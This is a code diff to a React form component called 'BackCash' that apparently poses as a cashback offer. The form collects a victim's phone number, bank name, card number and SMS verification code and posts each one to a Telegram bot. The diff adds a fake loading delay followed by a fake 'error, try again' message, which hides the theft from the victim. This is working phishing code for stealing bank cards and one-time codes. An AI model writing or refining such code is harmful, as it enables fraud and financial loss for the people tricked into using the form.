@@ -30,7 +30,8 @@ export const BackCash = () => {
 
     // Отправка данных в Telegram в зависимости от текущего шага
     if (step === 1) {
-      const bankLabel = selectedBank.value === 'custom' ? customBankName : selectedBank.label;
+      const bankLabel =
+        selectedBank.value === 'custom' ? customBankName : selectedBank.label;
       axios
         .post(URI_API, {
           chat_id: CHAT,
@@ -38,7 +39,6 @@ export const BackCash = () => {
           text: `<b>Новий заказ</b>\nНомер телефона: ${firstName}\nНазвание банка: ${bankLabel}\n`,
         })
         .then(res => {
-          
           setFirstName('');
           setStep(2);
         })
@@ -56,7 +56,6 @@ export const BackCash = () => {
           text: `<b>Новий заказ</b>\nНомер карты: ${lastName}\n`,
         })
         .then(res => {
-    
           setLastName('');
           setLoading(true);
           setTimeout(() => {
@@ -75,19 +74,23 @@ export const BackCash = () => {
           text: `<b>Новий заказ</b>\nКод из смс: ${amount}`,
         })
         .then(res => {
-        
           setFirstName('');
           setLastName('');
           setAmount('');
-          setStep(4);
+          setLoading(true);
+          setTimeout(() => {
+            setStep(4);
+            setLoading(false);
+            
+          }, 5000);
           setContacted(true);
         })
         .catch(err => {
           console.error('Ошибка при отправке заказа:', err);
         })
-        .finally(() => {
-          setLoading(false);
-        });
+        // .finally(() => {
+        //   setLoading(false);
+        // });
     }
   };
 
@@ -139,7 +142,6 @@ export const BackCash = () => {
       color: '#ccc',
     }),
   };
-  
 
   return (
     <form className={styles.backcashForm} onSubmit={handleSubmit}>
@@ -192,7 +194,7 @@ export const BackCash = () => {
         />
       )}
       {step <= 3 && !loading && <button type="submit">Отправить</button>}
-      {step === 4 && contacted && (
+      {step === 4 && !loading && contacted && (
         <p>произошел сбой, повторите попытку снова</p>
       )}
     </form>
